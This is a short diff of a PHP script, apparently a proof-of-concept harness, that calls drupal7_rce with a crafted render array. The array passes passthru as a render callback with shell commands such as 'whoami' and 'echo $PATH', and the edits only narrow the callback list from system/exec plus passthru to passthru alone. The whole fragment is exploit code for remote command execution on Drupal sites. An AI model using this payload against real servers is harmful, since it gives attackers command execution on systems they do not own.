@@ -65,8 +65,8 @@ class DrupalTest {
 
 }
 
-//$element = array('render'=>array('exec','passthru'),'children'=>'echo $PATH','message'=>1);
-$element = array('render'=>array('system','passthru'),'children'=>'whoami','message'=>1);
+//$element = array('render'=>array('passthru'),'children'=>'echo $PATH','message'=>1);
+$element = array('render'=>array('passthru'),'children'=>'whoami','message'=>1);
 $a = new DrupalTest();
 //$a->Drupal8_rce($element);
 $a->drupal7_rce($element);
